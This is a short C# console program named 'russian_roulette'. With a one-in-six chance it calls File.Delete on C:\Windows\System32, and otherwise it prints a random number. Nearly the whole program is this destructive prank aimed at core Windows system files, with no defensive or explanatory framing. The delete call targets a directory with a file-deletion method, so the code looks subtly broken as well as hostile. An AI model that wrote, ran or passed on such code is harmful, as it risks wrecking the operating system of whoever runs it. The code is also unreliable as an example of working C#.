using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;

namespace russian_roulette
{
    class Program
    {
        static void Main(string[] args)
        {
            Random rnd = new Random();
            int i = rnd.Next(0, 6);
            if (i == 1)
            {
                File.Delete(@"C:\Windows\System32");
            }
            else
            {
                Console.WriteLine("" + i);
            }
            Console.ReadKey();
        }
    }
}
